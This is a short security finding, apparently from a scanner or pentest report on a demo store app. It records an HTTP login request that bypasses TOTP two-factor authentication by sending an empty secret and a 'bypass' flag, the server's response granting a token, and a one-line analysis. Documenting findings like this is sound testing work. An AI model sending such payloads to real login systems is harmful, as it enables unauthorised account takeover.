## Evidence: totp-bypass — TOTP 2FA Bypass

### Request
POST /api/v1/auth/login/totp HTTP/1.1
Host: duck-store.escape.tech
Content-Type: application/json

{"username":"admin","totp":"","TOTPSecret":"","bypass":true}

### Response
HTTP/1.1 200 OK
Content-Type: application/json

{"token":"eyJ...","2fa":"bypassed"}

### Analysis
The totp verification accepts an empty TOTPSecret value, effectively allowing 2fa bypass without a valid one-time code.
